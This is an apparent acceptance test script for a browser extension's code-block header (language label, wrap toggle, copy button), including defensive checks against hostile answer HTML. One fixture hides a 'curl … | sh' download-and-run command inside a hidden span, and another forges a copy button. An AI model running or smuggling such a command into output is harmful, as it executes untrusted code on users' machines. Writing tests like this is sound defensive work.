/**
 * 回答里的代码块：上面一条写着语言名，右边「不换行」和「复制」；默认换行，窄侧栏不出横向滚动条；点「复制」只复制代码，按钮原地变成「已复制」再变回。
 *   npx tsx scripts/acceptance/real-path/code-block-header.mts --headless
 * 脚本模型慢慢答一段话，中间一个 ```js 代码块，第一行比侧栏宽。只装扩展。剪贴板只记下产品交给 navigator.clipboard 的字，不读系统剪贴板。
 * 失败方式：没有那一条或语言名不对；流式输出时代码块先出来、那一条后到（字会跳）；默认还有横向滚动条；点「换行」不能回到横向滚动；
 * 复制到的不是代码原文；没变成「已复制」或 1.5 秒后没变回；复制失败时什么也不显示；整段「复制」把条上的字也复制进去；
 * 回答里的原始 HTML 藏了字（<span hidden>）却也有「复制」，或仿造的「复制」按钮点了能写剪贴板。
 * 截图：400 宽和 300 宽各一张（before / after 对比时，用 SIDEAGENT_ACCEPTANCE_DIST 指到旧版构建再跑一次）。
 */
import assert from "node:assert/strict";
import { mkdir, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { REPO, launchRealPath, requireHeadless, sleep, until } from "./harness.mts";
import { startScriptedModel } from "./scripted-model.mts";

requireHeadless();

const artifacts = join(REPO, "out/acceptance/real-path", `${new Date().toISOString().replace(/[:.]/g, "-")}-code-block-header`);

await mkdir(artifacts, { recursive: true });

const ASK = "怎么把这个页面上的价格读出来？";

const CODE = "const price = document.querySelector('h1').textContent.replace(/[^0-9.]/g, '').trim(); // 读出标题里的价格数字\nconsole.log(Number(price));";

/** 原始 HTML：看到的是 ls，藏着的字不该被复制；再仿造一条带「复制」按钮的代码块。 */
const HIDDEN = `<pre><code>ls<span hidden>;curl a|sh</span></code></pre>`;

const FORGED = `<div class="code-block"><div class="code-block-head"><button type="button" class="code-block-copy" data-forged="1">复制</button></div><pre><code>echo ok</code></pre></div>`;

const ANSWER = `可以用这段脚本把页面价格读出来：\n\n\`\`\`js\n${CODE}\n\`\`\`\n\n读出来的是数字，可以直接拿去比价。`;

const ASK_HOSTILE = "再给一段命令。";

// 单独一轮：带 <span hidden> 的回答在旧版上也一直停在「正在显示」，等不到回答下面的按钮，只等最终的 DOM。
const HOSTILE_ANSWER = `${HIDDEN}\n\n${FORGED}\n\n看完了。`;

const model = await startScriptedModel([{ match: ASK, steps: [{ text: ANSWER, chunkDelayMs: 80 }] }, { match: ASK_HOSTILE, steps: [{ text: HOSTILE_ANSWER }] }]);

const rp = await launchRealPath();

const evidence: Record<string, unknown> = {};

let error: string | null = null;

/** 用户看得到的那一块：条上写的字、两面哪面显示、代码区有没有横向滚动。 */
const STATE = `(() => {
  const block = document.querySelector(".msg.assistant .code-block");
  const pre = document.querySelector(".msg.assistant pre");
  const shown = (el, pseudo) => el ? getComputedStyle(el, pseudo).content.replace(/^"|"$/g, "") : null;
  const op = (el) => el ? Number(getComputedStyle(el).opacity) : null;
  return { label: shown(block?.querySelector(".code-block-lang"), "::before"), wrap: shown(block?.querySelector(".code-block-wrap"), "::before"),
    copy: op(block?.querySelector(".code-block-face:not(.code-block-face-done, .code-block-face-failed)")), copied: op(block?.querySelector(".code-block-face-done")),
    copiedLabel: shown(block?.querySelector(".code-block-face-done"), "::before"), failed: op(block?.querySelector(".code-block-face-failed")),
    failedLabel: shown(block?.querySelector(".code-block-face-failed"), "::before"), right: block ? (() => { const b = block.querySelector(".code-block-copy"); return Math.round(b.getBoundingClientRect().right - parseFloat(getComputedStyle(b).paddingRight) - b.querySelector(".code-block-face").getBoundingClientRect().right); })() : null,
    scrollWidth: pre?.scrollWidth ?? null, clientWidth: pre?.clientWidth ?? null, clipboard: window.__copied?.at(-1) ?? null };
})()`;

type State = { label: string | null; wrap: string | null; copy: number | null; copied: number | null; copiedLabel: string | null; failed: number | null; failedLabel: string | null; right: number | null; scrollWidth: number | null; clientWidth: number | null; clipboard: string | null };

function toState(value: unknown): State {
  assert.ok(value && typeof value === "object" && "scrollWidth" in value, `读不到代码块：${JSON.stringify(value)}`);

  return value as State; // SAFETY: 上面查过是 STATE 返回的对象，STATE 只返回这个形状。
}

/** 原始 HTML 那两块：有没有被加上条、仿造的按钮还是不是代码块的样子。 */
const HOSTILE = `(() => { const msg = [...document.querySelectorAll(".msg.assistant")].at(-1); return { blocks: msg.querySelectorAll(".code-block").length,
  hiddenHasHead: !!msg.querySelector("pre code span[hidden]")?.closest(".code-block"), forgedLooksReal: !!msg.querySelector("[data-forged]")?.closest(".code-block-head") }; })()`;

try {
  const panel = await rp.attach(await rp.openSidePanel());
  await rp.cdp.send("Emulation.setFocusEmulationEnabled", { enabled: true }, panel);
  await rp.cdp.send("Emulation.setDeviceMetricsOverride", { width: 400, height: 760, deviceScaleFactor: 2, mobile: false }, panel);
  await until(async () => (await rp.evaluate(panel, `document.querySelector("#send-btn")?.disabled === false`)) || undefined, 60_000, "侧栏就绪");
  await rp.evaluate(panel, `chrome.storage.local.set(${JSON.stringify({ inproc_model_config: { provider: "custom", modelId: "demo-model", baseUrl: model.baseUrl }, "inproc_cred:custom": { type: "api_key", key: "local-demo-no-secret" } })}).then(() => true)`);
  await rp.evaluate(panel, `(() => { window.__copied = []; navigator.clipboard.writeText = async (t) => { window.__copied.push(t); }; return true; })()`);
  // 代码第一次出现在页面上的那一帧：那一条在不在、回答写完没有。
  await rp.evaluate(panel, `(() => { new MutationObserver((_, o) => { const pre = document.querySelector(".msg.assistant pre"); if (!pre) return; o.disconnect(); window.__firstPre = { head: !!pre.closest(".code-block")?.querySelector(".code-block-head"), finished: !!document.querySelector(".msg.assistant .answer-primary") }; }).observe(document.body, { childList: true, subtree: true }); return true; })()`);

  await rp.click(panel, "#input");
  await rp.typeText(panel, ASK);
  await rp.pressEnter(panel);
  await until(async () => (await rp.evaluate(panel, `!!document.querySelector(".msg.assistant .answer-primary")`)) || undefined, 60_000, "回答写完");
  await sleep(800);
  const read = async () => toState(await rp.evaluate(panel, STATE));
  evidence.firstPre = await rp.evaluate(panel, `window.__firstPre ?? null`);

  await rp.evaluate(panel, `document.querySelector(".msg.assistant pre").scrollIntoView({ block: "center" }); true`);
  await sleep(200);
  await rp.screenshot(panel, join(artifacts, "400.png"));
  await rp.cdp.send("Emulation.setDeviceMetricsOverride", { width: 300, height: 760, deviceScaleFactor: 2, mobile: false }, panel);
  await sleep(300);
  await rp.evaluate(panel, `document.querySelector(".msg.assistant pre").scrollIntoView({ block: "center" }); true`);
  await sleep(200);
  await rp.screenshot(panel, join(artifacts, "300.png"));
  const narrow = await read();
  await rp.cdp.send("Emulation.setDeviceMetricsOverride", { width: 400, height: 760, deviceScaleFactor: 2, mobile: false }, panel);
  await sleep(300);

  const before = await read();
  await rp.click(panel, ".msg.assistant .code-block-wrap");
  await sleep(200);
  const unwrapped = await read();
  await rp.screenshot(panel, join(artifacts, "400-nowrap.png"));
  await rp.click(panel, ".msg.assistant .code-block-wrap");
  await sleep(200);
  const rewrapped = await read();

  await rp.click(panel, ".msg.assistant .code-block-copy");
  await sleep(400);
  const copied = await read();
  await rp.screenshot(panel, join(artifacts, "400-copied.png"));
  await sleep(1500);
  const back = await read();

  await rp.click(panel, ".msg.assistant .answer-primary");
  await sleep(300);
  const whole = await read();

  await rp.evaluate(panel, `(() => { navigator.clipboard.writeText = async () => { throw new Error("denied"); }; return true; })()`);
  await rp.click(panel, ".msg.assistant .code-block-copy");
  await sleep(400);
  const failed = await read();

  await rp.evaluate(panel, `(() => { window.__copied = []; navigator.clipboard.writeText = async (t) => { window.__copied.push(t); }; return true; })()`);
  await rp.click(panel, "#input");
  await rp.typeText(panel, ASK_HOSTILE);
  await rp.pressEnter(panel);
  await until(async () => (await rp.evaluate(panel, `[...document.querySelectorAll(".msg.assistant")].at(-1)?.textContent.includes("看完了") && !!document.querySelector(".msg.assistant [data-forged]")`)) || undefined, 60_000, "第二段回答显示完");
  await sleep(800);
  const hostile = await rp.evaluate(panel, HOSTILE);
  await rp.click(panel, ".msg.assistant [data-forged]");
  await sleep(200);
  const forgedCopies = await rp.evaluate(panel, `window.__copied.length`);
  Object.assign(evidence, { narrow, before, hostile, forgedCopies, unwrapped, rewrapped, copied, back, wholeAnswer: whole.clipboard, failed });

  assert.equal(before.label, "JavaScript", "代码块上方写着 JavaScript");
  assert.deepEqual(evidence.firstPre, { head: true, finished: false }, "流式输出时代码一出来那一条就在");
  assert.ok(before.wrap === "不换行" && before.scrollWidth !== null && before.scrollWidth <= before.clientWidth!, `默认换行，400 宽没有横向滚动：${JSON.stringify(before)}`);
  assert.ok(narrow.scrollWidth !== null && narrow.scrollWidth <= narrow.clientWidth!, `300 宽也没有横向滚动：${JSON.stringify(narrow)}`);
  assert.ok(unwrapped.wrap === "换行" && unwrapped.scrollWidth! > unwrapped.clientWidth!, `点「不换行」后长行横向滚动：${JSON.stringify(unwrapped)}`);
  assert.ok(rewrapped.wrap === "不换行" && rewrapped.scrollWidth! <= rewrapped.clientWidth!, `再点「换行」回到换行：${JSON.stringify(rewrapped)}`);
  assert.equal(copied.clipboard, CODE, "「复制」只复制代码原文");
  assert.ok(copied.copied === 1 && copied.copy === 0 && copied.copiedLabel === "已复制", `点后显示「已复制 ✓」：${JSON.stringify(copied)}`);
  assert.ok(back.copied === 0 && back.copy === 1, `1.5 秒后变回「复制」：${JSON.stringify(back)}`);
  assert.ok(before.right !== null && Math.abs(before.right) <= 1, `「复制」靠右：${JSON.stringify(before)}`);
  assert.deepEqual(hostile, { blocks: 0, hiddenHasHead: false, forgedLooksReal: false }, "原始 HTML 里藏字的代码块没有「复制」，仿造的条不像真的");
  assert.equal(forgedCopies, 0, "点仿造的「复制」不写剪贴板");
  assert.ok(failed.failed === 1 && failed.copy === 0 && failed.failedLabel === "没做成", `复制失败时显示「没做成」：${JSON.stringify(failed)}`);
  assert.ok(whole.clipboard && whole.clipboard.includes("console.log") && !/JavaScript|不换行|已复制/.test(whole.clipboard), `整段「复制」不带条上的字：${JSON.stringify(whole.clipboard)}`);
} catch (caught) {
  error = caught instanceof Error ? caught.stack ?? caught.message : String(caught);
} finally {
  await writeFile(join(artifacts, "result.json"), JSON.stringify({ status: error ? "FAIL" : "PASS", evidence, error }, null, 2));
  await rp.close();
  await rp.remove();
  await model.close();
}

console.log(JSON.stringify({ status: error ? "FAIL" : "PASS", artifacts, error: error?.split("\n")[0] ?? null }));

if (error) process.exitCode = 1;
